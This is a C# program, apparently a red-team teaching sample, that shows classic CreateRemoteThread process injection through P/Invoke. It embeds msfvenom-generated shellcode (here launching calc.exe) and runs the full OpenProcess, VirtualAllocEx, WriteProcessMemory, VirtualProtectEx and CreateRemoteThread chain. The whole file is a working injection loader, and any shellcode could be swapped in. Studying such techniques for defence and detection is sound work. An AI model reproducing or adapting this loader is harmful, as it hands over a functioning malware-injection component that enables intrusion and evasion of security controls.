using System;
using static Loader.Imports;
using static Loader.Enums;

namespace CRT {

    class Program {
        /// <summary>
        /// This program will pop calc using the CreateRemoteThread style of process injection. 
        /// It uses classic P/Invoke to call the unmanged code. 
        /// </summary>
        
        static void Main(string[] args) {

            IntPtr hProc; // handle to our process
            IntPtr hMemory; // handle to the region of memory to write the shellcode to
            int pid = Convert.ToInt32(System.Diagnostics.Process.GetCurrentProcess().Id); // get the current pid
            bool success; // generic boolean to catch whether the command executed successfully
            MemoryProtection oldProtect; // the previous value of the memory protection of a memory segment
            IntPtr threadId; // the thread ID of our injected process

            // shellcode: msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
            byte[] buf = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };

            // Classic Process Injection using P/Invoke
            Console.WriteLine("[*] Beginning CreateRemoteThread Injection using P/Invoke (Classic), hit enter to continue...");
            Console.ReadLine();

            // Get a handle
            Console.WriteLine("[+] Calling OpenProcess using P/Invoke...");
            hProc = OpenProcess((uint)ProcessAccess.AllAccess, false, pid);
            Console.WriteLine("[>] Process Handle: " + string.Format("{0}", hProc.ToInt64()));

            // allocate a region of memory in the process to write to
            Console.WriteLine("[+] Calling VirtualAllocEx using P/Invoke...");
            hMemory = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
            Console.WriteLine("[>] Memory Handle: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Write the shellcode to the memory
            Console.WriteLine("[+] Calling WriteProcessMemory using P/Invoke...");
            success = WriteProcessMemory(hProc, hMemory, buf, buf.Length, out IntPtr bytesWritten);
            if (success)
            {
                Console.WriteLine("[>] Bytes Written: " + string.Format("{0}", bytesWritten.ToInt64()));
            }
            else
            {
                Console.WriteLine("[-] Failed to WriteProcessMemory, exiting...");
                return;
            }

            // Change the memory protections to RX
            Console.WriteLine("[+] Calling VirtualProtectEx using P/Invoke...");
            success = VirtualProtectEx(hProc, hMemory, bytesWritten, MemoryProtection.ExecuteRead, out oldProtect);
            if (success)
            {
                Console.WriteLine("[>] Changed Permissions at Memory Address: " + string.Format("0x{0:X}", hMemory.ToInt64()));
            }
            else
            {
                Console.WriteLine("[-] Failed to change memory permissions using VirtualProtectEx, exiting...");
                return;
            }

            // Create a thread to run the shellcode in memory
            Console.WriteLine("[+] Calling CreateRemoteThread using P/Invoke...");
            hMemory = CreateRemoteThread(hProc, IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, out threadId);
            Console.WriteLine("[>] Created Thread with ID: " + string.Format("{0}", threadId.ToInt64()));
            Console.ReadLine();
        }

    }
}

